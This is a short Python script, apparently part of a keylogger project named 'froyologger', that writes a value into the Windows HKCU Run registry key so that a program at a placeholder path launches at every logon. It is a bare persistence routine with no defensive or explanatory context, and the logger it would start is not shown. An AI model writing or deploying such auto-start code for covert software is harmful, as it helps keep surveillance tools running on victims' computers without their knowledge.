import sys, os
from winreg import *
 
keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'
try:
    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
except:
    key = CreateKey(HKEY_CURRENT_USER, keyVal)
SetValueEx(key, "froyologger", 0, REG_SZ,r"FILE PATH HERE")
CloseKey(key)


